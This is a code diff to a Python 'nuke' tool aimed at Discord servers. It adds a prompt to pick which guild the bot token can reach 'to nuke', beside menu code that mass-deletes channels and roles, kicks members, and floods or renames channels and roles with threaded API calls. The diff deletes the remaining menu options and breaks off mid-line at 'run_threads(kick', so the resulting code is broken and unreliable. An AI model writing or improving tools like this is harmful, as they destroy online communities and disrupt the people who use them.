@@ -135,12 +135,32 @@ def run_threads(target, items):
     for t in threads:
         t.join()
 
+def select_guild(token):
+    headers = {"Authorization": f"Bot {token}"}
+    r = requests.get(f"{API_BASE}/users/@me/guilds", headers=headers)
+    if r.status_code != 200:
+        rgb_print(f"Failed to fetch guilds: {r.status_code}")
+        return None
+    guilds = r.json()
+    if not guilds:
+        rgb_print("No guilds found for this bot token.")
+        return None
+    rgb_print("\nSelect a guild to nuke:")
+    for i, g in enumerate(guilds):
+        print(f"{Fore.YELLOW}{i+1}{Fore.RESET}. {g['name']} (ID: {g['id']})")
+    choice = get_input("Enter number: ", lambda x: x.isdigit() and 1 <= int(x) <= len(guilds))
+    return guilds[int(choice)-1]['id']
+
 def main():
     clear()
     rgb_print("🔥🔥🔥 WELCOME TO NUVEM DEVIL NUKE TOOL 🔥🔥🔥\n")
 
     token = get_input(Fore.CYAN + "Enter your bot token: ", lambda x: len(x) > 50)
-    guild_id = get_input(Fore.CYAN + "Enter the Guild ID to nuke: ", lambda x: x.isdigit())
+
+    guild_id = select_guild(token)
+    if guild_id is None:
+        rgb_print("Cannot proceed without selecting a guild.")
+        return
 
     nuker = NuvemNuker(token, guild_id)
 
@@ -160,6 +180,8 @@ def main():
 
         rocket_animation()
 
+        # rest of the menu options logic as before...
+
         if choice == "1":
             channels = nuker.get_channels()
             rgb_print(f"Deleting {len(channels)} channels...")
@@ -178,8 +200,9 @@ def main():
             rgb_print(f"Deleting {len(roles)} roles...")
 
             def delete_role_thread(role):
-                # Skip @everyone role
-                if role['id'] == nuker.guild_id:
+                # Skip @everyone role (usually role with id == guild_id?)
+                # Actually, @everyone role ID == guild id as string
+                if role['id'] == guild_id:
                     return
                 if nuker.delete_role(role['id']):
                     rgb_print(f"Deleted role: {role['name']} ({role['id']})")
@@ -214,54 +237,4 @@ def main():
                 else:
                     rgb_print(f"Failed to kick user ID: {uid}")
 
-            run_threads(kick_thread, members)
-            input(Fore.GREEN + "Finished kicking members! Press Enter to continue.")
-
-        elif choice == "5":
-            amount = get_input(Fore.YELLOW + "How many channels to create? ", lambda x: x.isdigit() and int(x) > 0)
-            amount = int(amount)
-            rgb_print(f"Creating {amount} channels...")
-
-            def create_channel_thread(_):
-                if nuker.create_channel("nuvem-channel"):
-                    rgb_print(f"Created channel nuvem-channel")
-                else:
-                    rgb_print(f"Failed to create channel")
-
-            run_threads(create_channel_thread, range(amount))
-            input(Fore.GREEN + "Finished creating channels! Press Enter to continue.")
-
-        elif choice == "6":
-            channels = nuker.get_channels()
-            new_name = get_input(Fore.YELLOW + "Enter new name for all channels: ", lambda x: len(x) > 0)
-            rgb_print(f"Renaming {len(channels)} channels to '{new_name}'...")
-
-            def rename_channel_thread(ch):
-                if nuker.rename_channel(ch['id'], new_name):
-                    rgb_print(f"Renamed channel {ch['name']} to {new_name}")
-                else:
-                    rgb_print(f"Failed to rename channel {ch['name']}")
-
-            run_threads(rename_channel_thread, channels)
-            input(Fore.GREEN + "Finished renaming channels! Press Enter to continue.")
-
-        elif choice == "7":
-            roles = nuker.get_roles()
-            new_name = get_input(Fore.YELLOW + "Enter new name for all roles: ", lambda x: len(x) > 0)
-            rgb_print(f"Renaming {len(roles)} roles to '{new_name}'...")
-
-            def rename_role_thread(role):
-                if nuker.rename_role(role['id'], new_name):
-                    rgb_print(f"Renamed role {role['name']} to {new_name}")
-                else:
-                    rgb_print(f"Failed to rename role {role['name']}")
-
-            run_threads(rename_role_thread, roles)
-            input(Fore.GREEN + "Finished renaming roles! Press Enter to continue.")
-
-        elif choice == "8":
-            rgb_print("Exiting NUVEM... Goodbye!")
-            break
-
-if __name__ == "__main__":
-    main()
+            run_threads(kick
